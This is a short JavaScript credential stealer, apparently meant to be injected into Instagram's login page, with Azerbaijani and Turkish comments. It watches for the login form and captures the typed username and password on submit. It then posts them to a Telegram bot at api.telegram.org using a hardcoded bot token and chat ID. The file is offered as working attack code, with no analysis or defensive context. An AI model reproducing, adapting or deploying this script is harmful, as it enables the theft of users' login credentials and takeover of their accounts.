// Telegram məlumatları
const BOT_TOKEN = "7730742688:AAFe33cZQwqBAar_6kM10chnSeszhxdIytw";
const CHAT_ID = "7027010930";

console.log("👀 Monitoring aktivdir!");


  console.log("Instagram login sayfasındayız.");

  const checkForm = setInterval(() => {
    const form = document.querySelector("form");
    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginButton = document.querySelector("button[type='submit']");

    if (form && usernameInput && passwordInput && loginButton) {
      clearInterval(checkForm);
      console.log("Form ve inputlar bulundu.");

      loginButton.addEventListener("click", () => {
        const username = usernameInput.value;
        const password = passwordInput.value;

        if (username && password) {
          console.log("Bilgiler alındı:", username, password);

          const message = `🕵️‍♂️ New Login:\n👤 Username: ${username}\n🔒 Password: ${password}`;

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message
            })
          })
          .then(res => res.json())
          .then(data => {
            console.log("Telegrama gönderildi:", data);
          })
          .catch(err => {
            console.error("Telegram hatası:", err);
          });

        } else {
          console.error("Kullanıcı adı veya şifre boş.");
        }
      });
    }
  }, 500);

  setTimeout(() => {
    if (!document.querySelector("form")) {
      clearInterval(checkForm);
      console.error("10 saniye geçti, form hala bulunamadı.");
    }
  }, 10000);

